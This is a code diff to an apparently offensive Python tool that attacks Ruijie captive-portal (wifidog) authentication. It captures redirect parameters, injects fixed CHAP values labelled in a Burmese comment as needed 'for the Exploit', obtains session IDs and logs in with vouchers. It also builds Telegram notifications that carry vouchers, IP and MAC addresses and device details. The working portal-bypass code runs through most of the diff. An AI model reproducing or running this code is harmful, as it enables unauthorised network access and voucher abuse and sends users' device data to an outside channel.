@@ -258,6 +258,8 @@ def show_banner(user_id, user_name):
  | |  | | | \ \| |__| | |__| | |  | | |\  |
  |_|  |_|_|  \_\\____/ \____/|_|  |_|_| \_|""")
     print(f"{C_CYAN}─" * 60)
+    print(f"{C_YELLOW}              >>>>>> SEASON 1 <<<<<<")
+    print(f"{C_CYAN}─" * 60)
     print(rf"""{C_YELLOW}  ______ _      ____  _   _ __  __ _    _  _____ _  __
  |  ____| |    / __ \| \ | |  \/  | |  | |/ ____| |/ /
  | |__  | |   | |  | |  \| | \  / | |  | | (___ | ' / 
@@ -286,24 +288,20 @@ async def send_telegram_notification(session, message):
 
 class RuijieLoginManager:
     def __init__(self, user_id, user_name):
-        self.ip = None
+        self.client_ip = None
+        self.gateway_ip = None
         self.mac = None
+        self.captured_params = {}
+        
         self.current_sid = None
         self.user_id = user_id
         self.user_name = user_name
-        self.load_saved_ip()
         self.load_saved_mac()
         self.phone_number = "12345678901"
         self.remaining_time = "Unknown"
         self.current_voucher = None
         self.attempt_count = get_attempt_count(user_id) + 1
         self.system_info = get_system_info()
-
-    def load_saved_ip(self):
-        if os.path.exists(".ip"):
-            try:
-                with open(".ip", "r") as f: self.ip = f.read().strip()
-            except: self.ip = None
 
     def load_saved_mac(self):
         if os.path.exists(".mac"):
@@ -313,65 +311,96 @@ class RuijieLoginManager:
 
     async def auto_detect_gateway(self, session):
         print(f"{INFO} Initializing network environment detection...")
+        
+        # Local IP ကို Python Socket သုံးပြီး အရင်ရှာပါမယ်
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            self.client_ip = s.getsockname()[0]
+            s.close()
+            # Gateway IP ကို Local IP ကနေ ခန့်မှန်းပါမယ်
+            parts = self.client_ip.split('.')
+            self.gateway_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
+        except:
+            self.client_ip = "192.168.110.249"
+            self.gateway_ip = "192.168.110.1"
+
         test_url = "http://connectivitycheck.gstatic.com/generate_204"
         headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile'}
+        
         try:
             async with session.get(test_url, headers=headers, timeout=5, allow_redirects=False) as resp:
-                if resp.status in (301, 302):
+                if resp.status in (301, 302, 303, 307):
                     location = resp.headers.get('Location', '')
                     parsed_url = urlparse(location)
                     query_params = parse_qs(parsed_url.query)
-                    gw_addr_list = query_params.get('gw_address') or query_params.get('ip')
-                    if gw_addr_list:
-                        self.ip = gw_addr_list[0]
-                        with open(".ip", "w") as f: f.write(self.ip)
-                        print(f"{SUCC} Gateway IP Resolved: {C_GREEN}{self.ip}{C_RESET}")
-                    mac_list = query_params.get('mac') or query_params.get('umac') or query_params.get('usermac')
+                    
+                    # Redirect URL ထဲမှာ ပါသမျှ Parameter တွေကို အကုန်ဖမ်းယူပါမယ်
+                    for key, value in query_params.items():
+                        self.captured_params[key] = value[0]
+                    
+                    # IP နဲ့ MAC ကို ခွဲထုတ်ပါမယ်
+                    if self.captured_params.get('gw_address'):
+                        self.gateway_ip = self.captured_params.get('gw_address')
+                        
+                    ip_list = self.captured_params.get('ip') or self.captured_params.get('wlanuserip')
+                    if ip_list:
+                        self.client_ip = ip_list
+                        
+                    mac_list = self.captured_params.get('mac') or self.captured_params.get('umac') or self.captured_params.get('usermac')
                     if mac_list:
-                        self.mac = mac_list[0]
+                        self.mac = mac_list
                         with open(".mac", "w") as f: f.write(self.mac)
-                        print(f"{SUCC} Physical MAC Resolved: {C_GREEN}{self.mac}{C_RESET}")
+                        
+                    print(f"{SUCC} Network Auto-Detected Successfully!")
+                    print(f"  ├─ Gateway IP : {C_GREEN}{self.gateway_ip}{C_RESET}")
+                    print(f"  ├─ Client IP  : {C_GREEN}{self.client_ip}{C_RESET}")
+                    print(f"  └─ MAC Address: {C_GREEN}{self.mac}{C_RESET}")
                     return True
-                else:
-                    if self.ip and self.mac:
-                        print(f"{SUCC} Using cached parameters -> [IP: {self.ip} | MAC: {self.mac}]")
-                        return True
-        except:
-            if self.ip and self.mac: return True
+        except Exception as e:
+            print(f"{WARN} Auto-detection issue: {e}")
+            
+        if self.client_ip and self.mac: 
+            print(f"{SUCC} Using fallback/cached parameters.")
+            return True
         return False
 
     async def _fetch_sid(self, session):
-        current_ip = self.ip if self.ip else "192.168.110.249"
-        current_gw = self.ip if self.ip else "192.168.110.1"
-        current_mac = self.mac if self.mac else "42:55:a5:d9:48:98"
         base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
         
-        # Updated parameters with your provided URL data
+        # ၁။ မူလ Default / Fallback Data များ
         params = {
             "stage": "portal", 
             "gw_id": "984a6b9da30e", 
             "gw_sn": "H1TA1EN003183",
-            "gw_address": current_gw, 
+            "gw_address": self.gateway_ip if self.gateway_ip else "192.168.110.1", 
             "gw_port": "2060", 
-            "ip": current_ip, 
-            "mac": current_mac,
+            "ip": self.client_ip if self.client_ip else "192.168.110.249", 
+            "mac": self.mac if self.mac else "42:55:a5:d9:48:98",
             "slot_num": "14", 
             "nasip": "192.168.1.198", 
             "ssid": "VLAN233", 
             "ustate": "0",
-            "mac_req": "1", 
-            "url": "http://httpbin.org/get", 
-            "chap_id": r"\374",
-            "chap_challenge": r"\045\035\225\235\263\213\210\154\215\123\114\326\204\333\266\113"
+            "mac_req": "1"
         }
         
+        # ၂။ Portal URL ကနေ ဖမ်းရလာတဲ့ Data တွေ အကုန်လုံးကို ပေါင်းထည့်ပါမယ် (Override လုပ်ခြင်း)
+        params.update(self.captured_params)
+        
+        # ၃။ Exploit အတွက် မဖြစ်မနေ လိုအပ်တဲ့ Key တွေကို အသေပြန်သတ်မှတ်ပါမယ်
+        params["url"] = "http://httpbin.org/get"
+        params["chap_id"] = r"\374"
+        params["chap_challenge"] = r"\045\035\225\235\263\213\210\154\215\123\114\326\204\333\266\113"
+        
+        # ၄။ URL အဖြစ် အတိအကျ ပြန်ပြောင်းခြင်း
         step1_url = f"{base_url}?{ '&'.join([f'{k}={quote(str(v))}' for k, v in params.items()]) }"
+        
         headers = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14; 22101316C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.120 Mobile',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
         }
         try:
-            print(f"{INFO} Establishing handshakes with endpoint proxy...")
+            print(f"{INFO} Establishing handshakes with generated endpoint proxy...")
             async with session.get(step1_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r1:
                 location = r1.headers.get('Location', '')
                 if not location and r1.status == 200:
@@ -380,11 +409,12 @@ class RuijieLoginManager:
                     if js_match: location = js_match.group(1)
                 if not location: location = step1_url
                 step2_url = urljoin("https://portal-as.ruijienetworks.com", location)
+                
             async with session.get(step2_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False) as r2:
                 target_url = r2.headers.get('Location', step2_url)
                 parsed_url = urlparse(target_url)
-                query_params = parse_qs(parsed_url.query)
-                sid_list = query_params.get('sessionId')
+                query_params_sid = parse_qs(parsed_url.query)
+                sid_list = query_params_sid.get('sessionId')
                 if sid_list:
                     self.current_sid = sid_list[0]
                     return self.current_sid
@@ -418,7 +448,7 @@ class RuijieLoginManager:
             f"🔑 *Voucher:* `{voucher}`\n"
             f"⏳ *Time Left:* `{remaining_time}`\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🌐 *IP Address:* `{self.ip or 'N/A'}`\n"
+            f"🌐 *IP Address:* `{self.client_ip or 'N/A'}`\n"
             f"🔗 *MAC Address:* `{self.mac or 'N/A'}`\n"
             f"💻 *Device:* `{self.system_info['system']} {self.system_info['release']}`\n"
             f"🖥️ *Arch:* `{self.system_info['machine']}`\n"
@@ -430,14 +460,13 @@ class RuijieLoginManager:
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
         )
         
-        # Add warning if time is running low
         if remaining_time != "Unknown" and remaining_time != "N/A":
             try:
                 if ":" in remaining_time:
                     parts = remaining_time.split(":")
                     if len(parts) >= 2:
                         minutes = int(parts[0]) * 60 + int(parts[1])
-                        if minutes < 300:  # Less than 5 minutes
+                        if minutes < 300: 
                             msg += f"⚠️ *WARNING: Only {remaining_time} remaining!*\n"
             except:
                 pass
@@ -447,12 +476,10 @@ class RuijieLoginManager:
     async def login_voucher(self, session, voucher, debug=False):
         global SUCCESS_COUNT
         
-        # Check rate limit
         if not check_rate_limit(self.user_id):
             print(f"{WARN} Rate limit exceeded! Please wait 5 seconds.")
             return False
         
-        # Validate voucher format
         if not validate_voucher(voucher):
             print(f"{FAIL} Invalid voucher format! Must be 6-12 alphanumeric characters.")
             return False
@@ -460,11 +487,10 @@ class RuijieLoginManager:
         self.current_voucher = voucher
         self.attempt_count = update_attempt_count(self.user_id)
         
-        # Send attempt notification
         await self.send_detailed_notification(session, "ATTEMPT", voucher=voucher)
         log_voucher_usage(
             self.user_id, self.user_name, voucher, "ATTEMPTING",
-            ip=self.ip or "N/A", mac=self.mac or "N/A"
+            ip=self.client_ip or "N/A", mac=self.mac or "N/A"
         )
         
         if not self.current_sid:
@@ -474,7 +500,7 @@ class RuijieLoginManager:
             await self.send_detailed_notification(session, "FAILED", voucher=voucher)
             log_voucher_usage(
                 self.user_id, self.user_name, voucher, "FAILED - No Session",
-                ip=self.ip or "N/A", mac=self.mac or "N/A"
+                ip=self.client_ip or "N/A", mac=self.mac or "N/A"
             )
             return False
 
@@ -515,21 +541,21 @@ class RuijieLoginManager:
                     log_voucher_usage(
                         self.user_id, self.user_name, voucher, "SUCCESS",
                         remaining_time=self.remaining_time,
-                        ip=self.ip or "N/A", mac=self.mac or "N/A"
+                        ip=self.client_ip or "N/A", mac=self.mac or "N/A"
                     )
                     return True
                 else:
                     await self.send_detailed_notification(session, "FAILED", voucher=voucher)
                     log_voucher_usage(
                         self.user_id, self.user_name, voucher, "FAILED - Invalid",
-                        ip=self.ip or "N/A", mac=self.mac or "N/A"
+                        ip=self.client_ip or "N/A", mac=self.mac or "N/A"
                     )
                     return False 
         except Exception as Error:
             await self.send_detailed_notification(session, "ERROR", voucher=voucher)
             log_voucher_usage(
                 self.user_id, self.user_name, voucher, f"ERROR - {str(Error)[:50]}",
-                ip=self.ip or "N/A", mac=self.mac or "N/A"
+                ip=self.client_ip or "N/A", mac=self.mac or "N/A"
             )
             return False
 
@@ -538,7 +564,7 @@ class RuijieLoginManager:
         headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'}
         params = {'token': self.current_sid, 'phoneNumber': self.phone_number}
         try:
-            current_gw = self.ip if self.ip else "192.168.110.1"
+            current_gw = self.gateway_ip if self.gateway_ip else "192.168.110.1"
             auth_url = f'http://{current_gw}:2060/wifidog/auth'
             async with session.post(auth_url, params=params, headers=headers, timeout=TIMEOUT_SEC) as response:
                 if response.status == 200:
